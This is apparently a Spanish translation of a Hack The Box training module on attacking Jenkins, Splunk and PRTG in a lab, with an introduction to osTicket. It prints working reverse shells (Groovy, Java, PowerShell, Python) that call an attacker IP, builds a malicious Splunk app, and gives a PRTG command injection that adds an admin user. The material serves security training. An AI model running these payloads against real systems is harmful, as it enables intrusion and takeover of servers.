![](https://academy.hackthebox.com/storage/modules/113/groovy_web.png)

Hay varias formas en que se puede aprovechar el acceso a la consola de scripts para obtener un shell inverso. Por ejemplo, usando el siguiente comando, o [esto](https://web.archive.org/web/20230326230234/https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console/) Módulo metasploit.

Código: groovy

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

Ejecutar los comandos anteriores da como resultado una conexión de shell inversa.

  Atacando a Jenkins

```shell-session
vcrdcr@htb[/htb]$ nc -lvnp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 57844

id

uid=0(root) gid=0(root) groups=0(root)

/bin/bash -i

root@app02:/var/lib/jenkins3#
```

Contra un host de Windows, podríamos intentar agregar un usuario y conectarlo al host a través de RDP o WinRM o, para evitar realizar un cambio en el sistema, usar una base de descarga de PowerShell con [Invoque-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). Podríamos ejecutar comandos en una instalación de Jenkins basada en Windows usando este fragmento:

Código: groovy

```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

También podríamos usar [esto](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy) Shell inverso de Java para obtener la ejecución de comandos en un host de Windows, intercambiando `localhost` y el puerto para nuestra dirección IP y puerto de escucha.

Código: groovy

```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

---

## Vulnerabilidades Varias

Existen varias vulnerabilidades de ejecución remota de código en varias versiones de Jenkins. Un exploit reciente combina dos vulnerabilidades, CVE-2018-1999002 y [CVE-2019-1003000](https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266) para lograr la ejecución remota de código preautenticada, omitir la protección de sandbox de seguridad de script durante la compilación de scripts. Los PoC de exploit público existen para explotar una falla en el enrutamiento dinámico de Jenkins para evitar el ACL de Lectura/General y usar Groovy para descargar y ejecutar un archivo JAR malicioso. Esta falla permite a los usuarios con permisos de lectura eludir las protecciones de sandbox y ejecutar código en el servidor maestro de Jenkins. Este exploit funciona contra Jenkins versión 2.137.

Existe otra vulnerabilidad en Jenkins 2.150.2, que permite a usuarios con creación de JOB y privilegios BUILD ejecutar código en el sistema a través de Node.js. Esta vulnerabilidad requiere autenticación, pero si los usuarios anónimos están habilitados, el exploit tendrá éxito porque estos usuarios tienen la creación de JOB y los privilegios BUILD de forma predeterminada.

Como hemos visto, obtener acceso a Jenkins como administrador puede conducir rápidamente a la ejecución remota de código. Si bien existen varios exploits RCE de trabajo para Jenkins, son específicos de la versión. En el momento de escribir este artículo, la versión actual de LTS de Jenkins es 2.303.1, que corrige los dos defectos detallados anteriormente. Al igual que con cualquier aplicación o sistema, es importante endurecer Jenkins tanto como sea posible, ya que la funcionalidad incorporada se puede usar fácilmente para hacerse cargo del servidor subyacente.

---

## Engranajes Cambiantes

Hemos cubierto varias formas en que se puede abusar de las aplicaciones populares de desarrollo de contenedores/software de CMS y servlet para explotar tanto las vulnerabilidades conocidas como la funcionalidad incorporada. Cambiemos un poco nuestro enfoque a dos conocidas herramientas de monitoreo de infraestructura/red: Splunk y PRTG Network Monitor.


# Splunk - Descubrimiento y enumeración

---

Splunk es una herramienta de análisis de registros utilizada para recopilar, analizar y visualizar datos. Aunque originalmente no estaba destinado a ser una herramienta SIEM, Splunk se usa a menudo para monitoreo de seguridad y análisis de negocios. Las implementaciones de Splunk a menudo se utilizan para albergar datos confidenciales y podrían proporcionar una gran cantidad de información para un atacante si se ven comprometidas. Históricamente, Splunk no ha sufrido muchas vulnerabilidades conocidas aparte de una vulnerabilidad de divulgación de información (CVE-2018-11409) y una vulnerabilidad de ejecución remota de código autenticada en versiones muy antiguas (CVE-2011-4642). Aquí hay algunos [detalles](https://www.splunk.com/en_us/customers.html) acerca de Splunk:

- Splunk fue fundada en 2003, se volvió rentable por primera vez en 2009 y tuvo su oferta pública inicial (IPO) en 2012 en NASDAQ bajo el símbolo SPLK
- Splunk tiene más de 7,500 empleados e ingresos anuales de casi $2.4 mil millones
- En 2020, Splunk fue nombrado en la lista Fortune 1000
- Los clientes de Splunk incluyen 92 compañías en la lista Fortune 100
- [Splunkbase](https://splunkbase.splunk.com/) permite a los usuarios de Splunk descargar aplicaciones y complementos para Splunk. A partir de 2021, hay más de 2,000 aplicaciones disponibles

La mayoría de las veces veremos Splunk durante nuestras evaluaciones, especialmente en grandes entornos corporativos durante las pruebas de penetración interna. Lo hemos visto expuesto externamente, pero esto es más raro. Splunk no sufre muchas vulnerabilidades explotables y se apresura a solucionar cualquier problema. El mayor enfoque de Splunk durante una evaluación sería la autenticación débil o nula porque el acceso de administrador a Splunk nos brinda la capacidad de implementar aplicaciones personalizadas que se pueden usar para comprometer rápidamente un servidor Splunk y posiblemente otros hosts en la red dependiendo de la forma en que Splunk esté configurado.

---

## Descubrimiento/Footprinting

Splunk es frecuente en redes internas y, a menudo, se ejecuta como root en Linux o SYSTEM en sistemas Windows. Aunque es poco común, podemos encontrar a Splunk enfrentando externamente a veces. Imaginemos que descubrimos una instancia olvidada de Splunk en nuestro informe Aquatone que desde entonces se ha convertido automáticamente a la versión gratuita, que no requiere autenticación. Como aún no hemos logrado afianzarnos en la red interna, centremos nuestra atención en Splunk y veamos si podemos convertir este acceso en RCE.

El servidor web Splunk se ejecuta de forma predeterminada en el puerto 8000. En versiones anteriores de Splunk, las credenciales predeterminadas son `admin:changeme`, que se muestran convenientemente en la página de inicio de sesión.

![imagen](https://academy.hackthebox.com/storage/modules/113/changme.png)

La última versión de Splunk establece credenciales durante el proceso de instalación. Si las credenciales predeterminadas no funcionan, vale la pena buscar contraseñas débiles comunes, como `admin`, `Welcome`, `Welcome1`, `Password123`, etc.

![imagen](https://academy.hackthebox.com/storage/modules/113/splunk_login.png)

Podemos descubrir Splunk con un escaneo rápido del servicio Nmap. Aquí podemos ver que Nmap identificó el `Splunkd httpd` servicio en el puerto 8000 y el puerto 8089, el puerto de administración de Splunk para la comunicación con la API REST de Splunk.

  Splunk - Descubrimiento y enumeración

```shell-session
vcrdcr@htb[/htb]$ sudo nmap -sV 10.129.201.50

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-22 08:43 EDT
Nmap scan report for 10.129.201.50
Host is up (0.11s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp open  ssl/http      Splunkd httpd
8080/tcp open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
8089/tcp open  ssl/http      Splunkd httpd
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.22 seconds
```

---

## Enumeración

La versión de prueba de Splunk Enterprise se convierte a una versión gratuita después de 60 días, lo que no requiere autenticación. No es raro que los administradores del sistema instalen una prueba de Splunk para probarlo, lo que posteriormente se olvida. Esto se convertirá automáticamente a la versión gratuita que no tiene ninguna forma de autenticación, introduciendo un agujero de seguridad en el entorno. Algunas organizaciones pueden optar por la versión gratuita debido a restricciones presupuestarias, sin comprender completamente las implicaciones de no tener administración de usuarios/rol.

![imagen](https://academy.hackthebox.com/storage/modules/113/license_group.png)

Una vez que haya iniciado sesión en Splunk (o haya accedido a una instancia de Splunk Free), podremos navegar por los datos, ejecutar informes, crear paneles, instalar aplicaciones desde la biblioteca de Splunkbase e instalar aplicaciones personalizadas.

   

![](https://academy.hackthebox.com/storage/modules/113/splunk_home.png)

Splunk tiene múltiples formas de ejecutar código, como aplicaciones Django del lado del servidor, puntos finales REST, entradas con scripts y scripts de alerta. Un método común para obtener la ejecución remota de código en un servidor Splunk es mediante el uso de una entrada con scripts. Estos están diseñados para ayudar a integrar Splunk con fuentes de datos como API o servidores de archivos que requieren métodos personalizados para acceder. Las entradas con guión están destinadas a ejecutar estos scripts, con STDOUT proporcionado como entrada a Splunk.

Como Splunk se puede instalar en hosts de Windows o Linux, se pueden crear entradas con scripts para ejecutar scripts Bash, PowerShell o Batch. Además, cada instalación de Splunk viene con Python instalado, por lo que los scripts de Python se pueden ejecutar en cualquier sistema Splunk. Una forma rápida de obtener RCE es creando una entrada con scripts que le dice a Splunk que ejecute un script de shell inverso de Python. Cubriremos esto en la siguiente sección.

Aparte de esta funcionalidad incorporada, Splunk ha sufrido varias vulnerabilidades públicas a lo largo de los años, como esta [SSRF](https://www.exploit-db.com/exploits/40895) eso podría usarse para obtener acceso no autorizado a la API REST de Splunk. Al momento de escribir, Splunk tiene [47](https://www.cvedetails.com/vulnerability-list/vendor_id-10963/Splunk.html) CVE. Si realizamos un análisis de vulnerabilidad contra Splunk durante una prueba de penetración, a menudo veremos muchas vulnerabilidades no explotables devueltas. Es por eso que es importante entender cómo abusar de la funcionalidad incorporada.


# Atacar a Splunk

---

Como se mencionó en la sección anterior, podemos obtener la ejecución remota de código en Splunk creando una aplicación personalizada para ejecutar scripts de Python, Batch, Bash o PowerShell. Desde el escaneo de descubrimiento de Nmap, notamos que nuestro objetivo es un servidor Windows. Dado que Splunk viene con Python instalado, podemos crear una aplicación Splunk personalizada que nos da ejecución remota de código usando Python o un script PowerShell.

---

## Abusar de la Funcionalidad Incorporada

Podemos usar [esto](https://github.com/0xjpuff/reverse_shell_splunk) Paquete Splunk para ayudarnos. El `bin` el directorio en este repositorio tiene ejemplos para [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) y [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1). Caminemos a través de este paso a paso.

Para lograr esto, primero necesitamos crear una aplicación Splunk personalizada utilizando la siguiente estructura de directorios.

  Atacar a Splunk

```shell-session
vcrdcr@htb[/htb]$ tree splunk_shell/

splunk_shell/
├── bin
└── default

2 directories, 0 files
```

El `bin` el directorio contendrá cualquier script que pretendamos ejecutar (en este caso, un shell inverso de PowerShell), y el directorio predeterminado tendrá nuestro `inputs.conf` archivo. Nuestro shell inverso será un PowerShell de una línea.

  Atacar a Splunk

```powershell-session
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

El [entradas.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) el archivo le dice a Splunk qué script ejecutar y cualquier otra condición. Aquí configuramos la aplicación como habilitada y le decimos a Splunk que ejecute el script cada 10 segundos. El intervalo es siempre en segundos, y la entrada (script) solo se ejecutará si esta configuración está presente.

  Atacar a Splunk

```shell-session
vcrdcr@htb[/htb]$ cat inputs.conf 

[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

Necesitamos el archivo .bat, que se ejecutará cuando se implemente la aplicación y ejecute la línea única de PowerShell.

  Atacar a Splunk

```shell-session
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

Una vez creados los archivos, podemos crear un tarball o `.spl` archivo.

  Atacar a Splunk

```shell-session
vcrdcr@htb[/htb]$ tar -cvzf updater.tar.gz splunk_shell/

splunk_shell/
splunk_shell/bin/
splunk_shell/bin/rev.py
splunk_shell/bin/run.bat
splunk_shell/bin/run.ps1
splunk_shell/default/
splunk_shell/default/inputs.conf
```

El siguiente paso es elegir `Install app from file` y sube la aplicación.

   

![](https://academy.hackthebox.com/storage/modules/113/install_app.png)

Antes de cargar la aplicación personalizada maliciosa, comencemos un oyente usando Netcat o [sócate](https://linux.die.net/man/1/socat).

  Atacar a Splunk

```shell-session
vcrdcr@htb[/htb]$ sudo nc -lnvp 443

listening on [any] 443 ...
```

En el `Upload app` página, haga clic en navegar, elija el tarball que creamos anteriormente y haga clic en `Upload`.

   

![](https://academy.hackthebox.com/storage/modules/113/upload_app.png)

Tan pronto como carguemos la aplicación, se recibe un shell inverso ya que el estado de la aplicación se cambiará automáticamente `Enabled`.

  Atacar a Splunk

```shell-session
vcrdcr@htb[/htb]$ sudo nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.50] 53145


PS C:\Windows\system32> whoami

nt authority\system


PS C:\Windows\system32> hostname

APP03


PS C:\Windows\system32>
```

En este caso, recuperamos un proyectil como `NT AUTHORTY\SYSTEM`. Si se tratara de una evaluación del mundo real, podríamos proceder a enumerar el objetivo de las credenciales en el registro, la memoria o almacenadas en otro lugar del sistema de archivos para usarlas para el movimiento lateral dentro de la red. Si este fuera nuestro punto de apoyo inicial en el entorno de dominio, podríamos usar este acceso para comenzar a enumerar el dominio de Active Directory.

Si estuviéramos tratando con un host de Linux, tendríamos que editar el `rev.py` Script de Python antes de crear el tarball y cargar la aplicación maliciosa personalizada. El resto del proceso sería el mismo, y obtendríamos una conexión de shell inversa en nuestro oyente Netcat y nos íbamos a las carreras.

Código: pitón

```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

Si el host Splunk comprometido es un servidor de implementación, es probable que sea posible lograr RCE en cualquier host con Universal Forwarders instalado en ellos. Para empujar un shell inverso a otros hosts, la aplicación debe colocarse en el `$SPLUNK_HOME/etc/deployment-apps` directorio en el host comprometido. En un entorno de Windows pesado, necesitaremos crear una aplicación usando un shell inverso de PowerShell ya que los reenviadores universales no se instalan con Python como el servidor Splunk.


# Monitor de red PRTG

---

[Monitor de red PRTG](https://www.paessler.com/prtg) es un software de monitor de red sin agente. Se puede usar para monitorear el uso del ancho de banda, el tiempo de actividad y recopilar estadísticas de varios hosts, incluidos enrutadores, conmutadores, servidores y más. La primera versión de PRTG fue lanzada en 2003. En 2015 se lanzó una versión gratuita de PRTG, restringida a 100 sensores que se pueden usar para monitorear hasta 20 hosts. Funciona con un modo de descubrimiento automático para escanear áreas de una red y crear una lista de dispositivos. Una vez que se crea esta lista, puede recopilar más información de los dispositivos detectados utilizando protocolos como ICMP, SNMP, WMI, NetFlow y más. Los dispositivos también pueden comunicarse con la herramienta a través de una API REST. El software se ejecuta completamente desde un sitio web basado en AJAX, pero hay una aplicación de escritorio disponible para Windows, Linux y macOS. Algunos datos interesantes sobre PRTG:

- Según la compañía, es utilizado por 300.000 usuarios en todo el mundo
- La compañía que fabrica la herramienta, Paessler, ha estado creando soluciones de monitoreo desde 1997
- Algunas organizaciones que usan PRTG para monitorear sus redes incluyen el Aeropuerto Internacional de Nápoles, Virginia Tech, 7-Eleven y [más](https://www.paessler.com/company/casestudies)

Con los años, PRTG ha sufrido de [26 vulnerabilidades](https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html) a eso se les asignaron CVE. De todos estos, solo cuatro tienen PoC de explotación pública fáciles de encontrar, dos secuencias de comandos en sitios cruzados (XSS), una Denegación de servicio y una vulnerabilidad de inyección de comandos autenticada que cubriremos en esta sección. Es raro ver PRTG expuesto externamente, pero a menudo nos hemos encontrado con PRTG durante las pruebas de penetración interna. El cuadro de liberación semanal HTB [Netmon](https://0xdf.gitlab.io/2019/06/29/htb-netmon.html) vitrinas PRTG.

---

## Descubrimiento/Footprinting/Enumeración

Podemos descubrir rápidamente PRTG a partir de un escaneo Nmap. Por lo general, se puede encontrar en puertos web comunes como 80, 443 u 8080. Es posible cambiar el puerto de la interfaz web en la sección Configuración cuando se inicia sesión como administrador.

  Monitor de red PRTG

```shell-session
vcrdcr@htb[/htb]$ sudo nmap -sV -p- --open -T4 10.129.201.50

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-22 15:41 EDT
Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.06% done
Nmap scan report for 10.129.201.50
Host is up (0.11s latency).
Not shown: 65492 closed ports, 24 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  ssl/http      Splunkd httpd
8080/tcp  open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
8089/tcp  open  ssl/http      Splunkd httpd
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.17 seconds
```

Desde el escaneo Nmap anterior, podemos ver el servicio `Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)` detectado en el puerto 8080.

PRTG también aparece en el escaneo EyeWitness que realizamos anteriormente. Aquí podemos ver que EyeWitness enumera las credenciales predeterminadas `prtgadmin:prtgadmin`. Por lo general, están precargados en la página de inicio de sesión y, a menudo, los encontramos sin cambios. Los escáneres de vulnerabilidad como Nessus también tienen [plugins](https://www.tenable.com/plugins/nessus/51874) que detectan la presencia de PRTG.

![imagen](https://academy.hackthebox.com/storage/modules/113/prtg_eyewitness.png)

Una vez que hayamos descubierto PRTG, podemos confirmar navegando a la URL y se nos presenta la página de inicio de sesión.

   

![](https://academy.hackthebox.com/storage/modules/113/prtg_login.png)

A partir de la enumeración que realizamos hasta ahora, parece ser la versión PRTG `17.3.33.2830` y es probable que sea vulnerable a [CVE-2018-9276](https://nvd.nist.gov/vuln/detail/CVE-2018-9276) que es una inyección de comandos autenticada en la consola web PRTG System Administrator para PRTG Network Monitor en versiones anteriores a la 18.2.39. Según la versión reportada por Nmap, podemos suponer que estamos tratando con una versión vulnerable. Usando `cURL` podemos ver que el número de versión es de hecho `17.3.33.283`.

  Monitor de red PRTG

```shell-session
vcrdcr@htb[/htb]$ curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version

  <link rel="stylesheet" type="text/css" href="/css/prtgmini.css?prtgversion=17.3.33.2830__" media="print,screen,projection" />
<div><h3><a target="_blank" href="https://blog.paessler.com/new-prtg-release-21.3.70-with-new-azure-hpe-and-redfish-sensors">New PRTG release 21.3.70 with new Azure, HPE, and Redfish sensors</a></h3><p>Just a short while ago, I introduced you to PRTG Release 21.3.69, with a load of new sensors, and now the next version is ready for installation. And this version also comes with brand new stuff!</p></div>
    <span class="prtgversion">&nbsp;PRTG Network Monitor 17.3.33.2830 </span>
```

Nuestro primer intento de iniciar sesión con las credenciales predeterminadas falla, pero algunos intentos más tarde, estamos en `prtgadmin:Password123`.

   

![](https://academy.hackthebox.com/storage/modules/113/prtg_logged_in.png)

---

## Aprovechamiento de Vulnerabilidades Conocidas

Una vez que haya iniciado sesión, podemos explorar un poco, pero sabemos que esto es probablemente vulnerable a una falla de inyección de comandos, así que vamos a hacerlo. Esto excelente [entrada de blog](https://www.codewatch.org/blog/?p=453) por el individuo que descubrió este defecto hace un gran trabajo de caminar a través del proceso de descubrimiento inicial y cómo lo descubrieron. Al crear una nueva notificación, el `Parameter` el campo se pasa directamente a un script de PowerShell sin ningún tipo de desinfección de entrada.

Para empezar, el ratón se acabó `Setup` en la parte superior derecha y luego en el `Account Settings` menú y finalmente haga clic en `Notifications`.

   

![](https://academy.hackthebox.com/storage/modules/113/prtg_notifications.png)

A continuación, haga clic en `Add new notification`.

   

![](https://academy.hackthebox.com/storage/modules/113/prtg_add.png)

Dé un nombre a la notificación y desplácese hacia abajo y marque la casilla junto a `EXECUTE PROGRAM`. Bajo `Program File`, seleccione `Demo exe notification - outfile.ps1` desde el menú desplegable. Finalmente, en el campo de parámetros, ingrese un comando. Para nuestros propósitos, agregaremos un nuevo usuario administrador local ingresando `test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add`. Durante una evaluación real, es posible que deseemos hacer algo que no cambie el sistema, como obtener un shell inverso o una conexión a nuestro C2 favorito. Finalmente, haga clic en el `Save` botón.

![imagen](https://academy.hackthebox.com/storage/modules/113/prtg_execute.png)

Después de hacer clic `Save`, seremos redirigidos al `Notifications` página y ver nuestra nueva notificación nombrado `pwn` en la lista.

   

![](https://academy.hackthebox.com/storage/modules/113/prtg_pwn.png)

Ahora, podríamos haber programado la notificación para que se ejecute (y ejecute nuestro comando) en un momento posterior al configurarla. Esto podría resultar útil como mecanismo de persistencia durante un compromiso a largo plazo y vale la pena tomar nota. Los horarios se pueden modificar en el menú de configuración de la cuenta si queremos configurarlo para que se ejecute a una hora específica todos los días para recuperar nuestra conexión o algo de esa naturaleza. En este punto, todo lo que queda es hacer clic en el `Test` botón para ejecutar nuestra notificación y ejecutar el comando para agregar un usuario administrador local. Después de hacer clic `Test` obtendremos una ventana emergente que dice `EXE notification is queued up`. Si recibimos algún tipo de mensaje de error aquí, podemos volver atrás y verificar la configuración de notificación.

Dado que se trata de una ejecución de comandos a ciegas, no recibiremos ningún comentario, por lo que tendríamos que revisar a nuestro oyente para obtener una conexión o, en nuestro caso, verificar si podemos autenticarnos en el host como administrador local. Podemos usar `CrackMapExec` para confirmar el acceso de administrador local. También podríamos intentar RDP a la caja, acceder a través de WinRM o usar una herramienta como [malvado-winrm](https://github.com/Hackplayers/evil-winrm) o algo de la [embaque](https://github.com/SecureAuthCorp/impacket) kit de herramientas como `wmiexec.py` o `psexec.py`.

  Monitor de red PRTG

```shell-session
vcrdcr@htb[/htb]$ sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG! 

SMB         10.129.201.50   445    APP03            [*] Windows 10.0 Build 17763 (name:APP03) (domain:APP03) (signing:False) (SMBv1:False)
SMB         10.129.201.50   445    APP03            [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
```

¡Y confirmamos el acceso de administrador local en el objetivo! Trabaje a través del ejemplo y replique todos los pasos por su cuenta contra el sistema de destino. Desafíate a ti mismo para aprovechar también la vulnerabilidad de inyección de comandos para obtener una conexión de shell inversa del objetivo.

---

## Hacia adelante

Ahora que hemos cubierto Splunk y PRTG, sigamos adelante y discutamos algunas herramientas comunes de administración de servicio al cliente y administración de configuración y veamos cómo podemos abusar de ellas durante nuestros compromisos.


# osTicket

---

[osTicket](https://osticket.com/) es un sistema de venta de entradas de soporte de código abierto. Se puede comparar con sistemas como Jira, OTRS, Request Tracker y Spiceworks. osTicket puede integrar las consultas de los usuarios desde el correo electrónico, el teléfono y los formularios basados en la web en una interfaz web. osTicket está escrito en PHP y utiliza un backend MySQL. Se puede instalar en Windows o Linux. Aunque no hay una cantidad considerable de información de mercado disponible sobre osTicket, una búsqueda rápida de Google `Helpdesk software - powered by osTicket` devuelve unos 44.000 resultados, muchos de los cuales parecen ser empresas, sistemas escolares, universidades, gobierno local, etc., utilizando la aplicación. osTicket incluso se mostró brevemente en la feria [Sr. Robot](https://forum.osticket.com/d/86225-osticket-on-usas-mr-robot-s01e08).

Además de aprender a enumerar y atacar osTicket, el propósito de esta sección también es presentarle el mundo de los sistemas de venta de boletos de soporte y por qué no deben pasarse por alto durante nuestras evaluaciones.

---

## Huella/Descubrimiento/Enumeración

Mirando hacia atrás en nuestro escaneo de EyeWitness de antes, notamos una captura de pantalla de una instancia de osTicket que también muestra que una cookie se llama `OSTSESSID` se estableció al visitar la página.

![imagen](https://academy.hackthebox.com/storage/modules/113/osticket_eyewitness.png)

Además, la mayoría de las instalaciones de osTicket mostrarán el logotipo de osTicket con la frase `powered by` delante de él en el pie de página de la página. El pie de página también puede contener las palabras `Support Ticket System`.

   

![](https://academy.hackthebox.com/storage/modules/113/osticket_main.png)

Un escaneo de Nmap solo mostrará información sobre el servidor web, como Apache o IIS, y no nos ayudará a establecer la huella de la aplicación.

`osTicket` es una aplicación web que está altamente mantenida y atendida. Si miramos el [CVE](https://www.cvedetails.com/vendor/2292/Osticket.html) encontrado durante décadas, no encontraremos muchas vulnerabilidades y exploits que osTicket podría tener. Este es un excelente ejemplo para mostrar lo importante que es entender cómo funciona una aplicación web. Incluso si la aplicación no es vulnerable, todavía se puede utilizar para nuestros propósitos. Aquí podemos desglosar las funciones principales en las capas:

|`1. User input`|`2. Processing`|`3. Solution`|
|---|---|---|

#### Entrada de Usuario

La función principal de osTicket es informar a los empleados de la compañía sobre un problema para que un problema pueda resolverse con el servicio u otros componentes. Una ventaja significativa que tenemos aquí es que la aplicación es de código abierto. Por lo tanto, tenemos muchos tutoriales y ejemplos disponibles para echar un vistazo más de cerca a la aplicación. Por ejemplo, desde el osTicket [documentación](https://docs.osticket.com/en/latest/Getting%20Started/Post-Installation.html), podemos ver que solo el personal y los usuarios con privilegios de administrador pueden acceder al panel de administración. Así que si nuestra empresa objetivo utiliza esta o una aplicación similar, podemos causar un problema y "jugar tonto" y ponerse en contacto con el personal de la empresa. La "falta de" simuladael conocimiento sobre los servicios ofrecidos por la empresa en combinación con un problema técnico es un enfoque generalizado de ingeniería social para obtener más información de la empresa.

#### Procesamiento

Como personal o administradores, intentan reproducir errores significativos para encontrar el núcleo del problema. El procesamiento finalmente se realiza internamente en un entorno aislado que tendrá configuraciones muy similares a los sistemas en producción. Supongamos que el personal y los administradores sospechan que hay un error interno que puede estar afectando el negocio. En ese caso, entrarán en más detalles para descubrir posibles errores de código y abordar problemas más importantes.

#### Solución

Dependiendo de la profundidad del problema, es muy probable que otros miembros del personal de los departamentos técnicos participen en la correspondencia por correo electrónico. Esto nos dará nuevas direcciones de correo electrónico para usar contra el panel de administración de osTicket (en el peor de los casos) y posibles nombres de usuario con los que podemos realizar OSINT o intentar aplicar a otros servicios de la empresa.

---

## Atacar osTicket

Una búsqueda de osTicket en exploit-db muestra varios problemas, incluyendo la inclusión remota de archivos, inyección SQL, carga arbitraria de archivos, XSS, etc osTicket versión 1.14.1 sufre de [CVE-2020-24881](https://nvd.nist.gov/vuln/detail/CVE-2020-24881) que era una vulnerabilidad de la SSRF. Si se explota, este tipo de falla puede aprovecharse para obtener acceso a recursos internos o realizar un escaneo interno de puertos.

Además de las vulnerabilidades relacionadas con las aplicaciones web, los portales de soporte a veces se pueden usar para obtener una dirección de correo electrónico para un dominio de la empresa, que se puede usar para registrarse en otras aplicaciones expuestas que requieren que se envíe una verificación por correo electrónico. Como se mencionó anteriormente en el módulo, esto se ilustra en el cuadro de liberación semanal HTB [Entrega](https://0xdf.gitlab.io/2021/05/22/htb-delivery.html) con un video tutorial [aquí](https://www.youtube.com/watch?v=gbs43E71mFM).

Caminemos a través de un ejemplo rápido, que está relacionado con esto [excelente publicación de blog](https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c) que [@ippsec](https://twitter.com/ippsec) también se mencionó una inspiración para su caja Entrega que recomiendo encarecidamente salir después de leer esta sección.

Supongamos que encontramos un servicio expuesto, como el servidor Slack de una empresa o GitLab, que requiere una dirección de correo electrónico válida de la empresa para unirse. Muchas empresas tienen un correo electrónico de soporte como `support@inlanefreight.local`y los correos electrónicos enviados a esto están disponibles en portales de soporte en línea que pueden variar desde Zendesk hasta una herramienta personalizada interna. Además, un portal de soporte puede asignar una dirección de correo electrónico interna temporal a un nuevo ticket para que los usuarios puedan verificar rápidamente su estado.

Si nos encontramos con un portal de atención al cliente durante nuestra evaluación y podemos enviar un nuevo ticket, es posible que podamos obtener una dirección de correo electrónico válida de la empresa.

   

